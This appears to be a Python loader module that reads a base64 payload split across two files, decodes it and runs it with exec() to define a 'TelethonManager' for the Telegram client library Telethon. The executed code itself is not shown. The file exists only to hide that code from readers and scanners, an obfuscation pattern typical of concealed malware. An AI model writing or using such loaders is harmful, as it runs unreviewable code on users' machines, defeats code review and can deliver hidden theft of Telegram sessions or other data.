"""Load TelethonManager from split base64 payload."""
from pathlib import Path
import base64

_dir = Path(__file__).parent
_payload = (_dir / "telethon_manager.b64.a").read_text().strip() + (_dir / "telethon_manager.b64.b").read_text().strip()
exec(base64.b64decode(_payload).decode("utf-8"), globals())
